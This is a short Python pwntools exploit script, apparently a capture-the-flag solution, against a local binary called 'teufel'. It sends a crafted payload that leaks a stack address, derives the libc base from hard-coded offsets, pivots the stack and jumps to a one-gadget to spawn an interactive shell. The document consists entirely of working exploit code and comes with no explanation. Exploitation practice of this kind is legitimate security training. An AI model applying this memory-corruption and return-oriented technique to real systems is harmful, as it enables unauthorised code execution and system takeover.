from pwn import *

target = "./teufel"

p = process(target)
e = ELF(target)

#raw_input('')

libc_off = 0x5e8000
vul_addr = 0x4004e6

p.send(p64(0xf0))

payload = "A"*8
payload += "Z"

p.send(payload)

# 41414141414141415a50fff7ff7f0a
data = p.recv()
rbp = "\x00" + data.split("Z")[1][:-1]
rbp = u64(rbp.ljust(8, "\x00"))
libc_base = rbp - libc_off
one_shot  = libc_base + 0x4526a
# pop rsi; pop r15; ret : 0xf0784
ppr       = libc_base + 0xf0784
ret_again = 0x4004cd
#one_shot  = libc_base + 0xf0280
system    = libc_base + 0x45390

print "rbp    : {}".format(hex(rbp))
print "libc   : {}".format(hex(libc_base))
print "system : {}".format(hex(system))
raw_input()

p.send(p64(0xf0))
payload = p64(0xf0)
payload += p64(rbp-0x2800)
payload += p64(ret_again)
p.send(payload)
print p.recv()

raw_input('')
p.send(p64(0xf0))

payload = p64(0xf0)
payload += p64(rbp-0x2800)
payload += p64(one_shot)
p.send(payload)

p.interactive()

